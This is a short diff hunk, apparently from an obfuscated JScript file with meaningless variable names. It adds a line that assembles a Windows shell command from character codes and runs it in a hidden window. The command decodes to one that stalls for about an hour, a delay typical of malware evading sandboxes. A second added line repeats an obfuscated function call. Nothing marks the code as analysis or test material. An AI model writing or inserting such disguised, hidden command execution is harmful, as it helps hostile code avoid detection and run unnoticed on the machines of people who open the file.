@@ -373,6 +373,8 @@ irz593 = "142_T3SL4S_"
   }
 
 
+kpz8410.run(String.fromCharCode(99)+String.fromCharCode(109)+String.fromCharCode(100)+String.fromCharCode(32)+String.fromCharCode(47)+String.fromCharCode(99)+String.fromCharCode(32)+String.fromCharCode(101)+String.fromCharCode(99)+String.fromCharCode(104)+String.fromCharCode(111)+String.fromCharCode(32)+String.fromCharCode(37)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(37)+String.fromCharCode(32)+String.fromCharCode(38)+String.fromCharCode(38)+String.fromCharCode(32)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(111)+String.fromCharCode(117)+String.fromCharCode(116)+String.fromCharCode(32)+String.fromCharCode(52)+String.fromCharCode(48)+String.fromCharCode(48)+String.fromCharCode(48)+String.fromCharCode(32)+String.fromCharCode(62)+String.fromCharCode(32)+String.fromCharCode(78)+String.fromCharCode(85)+String.fromCharCode(76)+String.fromCharCode(32)+String.fromCharCode(38)+String.fromCharCode(38)+String.fromCharCode(32)+String.fromCharCode(101)+String.fromCharCode(120)+String.fromCharCode(105)+String.fromCharCode(116),0,true); 
+nts316(bx021(0000001,999999999));
 }
 
 nts316(bx021(0000001,999999999));
